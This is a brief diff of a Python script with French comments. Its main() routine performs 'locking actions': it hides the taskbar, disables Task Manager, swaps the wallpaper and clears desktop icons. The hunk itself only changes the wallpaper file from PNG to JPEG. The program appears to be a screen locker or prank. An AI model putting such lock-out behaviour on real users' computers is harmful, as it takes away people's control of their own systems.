@@ -138,7 +138,7 @@ def main():
     # Effectuer les actions de verrouillage
     hide_taskbar()
     disable_task_manager()
-    set_wallpaper("photo.png")
+    set_wallpaper("photo.jpeg")
     clear_desktop_icons()
     
     # Fermer la fenêtre et arrêter le listener après 5 secondes
